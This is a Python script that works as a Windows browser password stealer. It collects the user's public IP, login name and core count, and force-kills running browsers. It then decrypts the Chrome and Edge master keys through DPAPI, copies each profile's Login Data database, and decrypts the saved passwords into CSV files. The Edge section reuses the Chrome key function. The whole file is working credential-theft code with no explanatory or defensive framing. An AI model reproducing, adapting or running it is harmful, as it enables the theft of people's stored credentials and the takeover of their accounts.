import os
import re
import requests
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import csv

ip = requests.get("https://api.ipify.org")  # just remember to do ip.text or ip.content
name = os.getlogin()
cores = os.cpu_count()


browsers = ["chrome.exe","msedge.exe","firefox.exe","opera.exe","iexplore.exe","brave.exe","vivaldi.exe","arc.exe"]
for browser in browsers:
        kill = f"taskkill /F /IM {browser}"
        result = os.system(kill)
  


chrome_localstate = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
chromepath = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
edge_localstate = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Local State"%(os.environ['USERPROFILE']))
edgepath = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data"%(os.environ['USERPROFILE']))

def get_secret_key():
    try:
        with open( chrome_localstate, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        return None
        
if __name__ == '__main__':
    try:
        with open('passwords.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index","url","username","password"])
            secret_key = get_secret_key()
            folders = [element for element in os.listdir(chromepath) if re.search("^Profile*|^Default$",element)!=None]
            for folder in folders:
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(chromepath,folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url!="" and username!="" and ciphertext!=""):
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            csv_writer.writerow([index,url,username,decrypted_password])
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
    except Exception as e:
        print("[ERR] %s"%str(e))

def get_secret_key_edge():
    try:
        with open( edge_localstate, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        return None
    
def decrypt_payload_edge(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher_edge(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password_edge(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        return ""
    
def get_db_connection_edge(chrome_path_login_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        return None
        
if __name__ == '__main__':
    try:
        with open('edgepasswords.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index","url","username","password"])
            secret_key = get_secret_key()
            folders = [element for element in os.listdir(edgepath) if re.search("^Profile*|^Default$",element)!=None]
            for folder in folders:
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(edgepath,folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url!="" and username!="" and ciphertext!=""):
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            csv_writer.writerow([index,url,username,decrypted_password])
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
    except Exception as e:
        print("[ERR] %s"%str(e))
